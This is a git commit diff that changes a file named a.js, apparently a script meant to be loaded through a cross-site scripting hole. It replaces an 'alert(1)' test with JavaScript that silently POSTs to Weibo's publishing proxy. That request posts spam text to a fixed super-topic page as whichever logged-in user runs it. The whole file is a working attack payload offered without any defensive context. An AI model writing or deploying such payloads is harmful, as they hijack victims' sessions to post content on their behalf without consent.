619fe65f18f08f4d8adb72ffe900f38017470196
opensourcessss <fuxuemin888@126.com>
2018-12-17 17:35:32 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,1 +1,5 @@
-alert(1);
+     var xhr = new XMLHttpRequest();
+        xhr.open('post', 'https://weibo.com/p/aj/proxy' );
+        xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        xhr.send('location=page_100808_super_index&text=888899888888&appkey=&style_type=1&pic_id=&tid=&pdetail=1008088ed414e614c7d4d35db32c9039916adf&mid=&isReEdit=false&sync_wb=1&pub_source=page_1&api=http://i.huati.weibo.com/pcpage/operation/publisher/sendcontent?sign=super&page_id=1008088ed414e614c7d4d35db32c9039916adf&object_id=1022:1008088ed414e614c7d4d35db32c9039916adf&module=publish_913&page_module_id=913&longtext=1&topic_id=1022:1008088ed414e614c7d4d35db32c9039916adf&pub_type=dialog&_t=0');
+
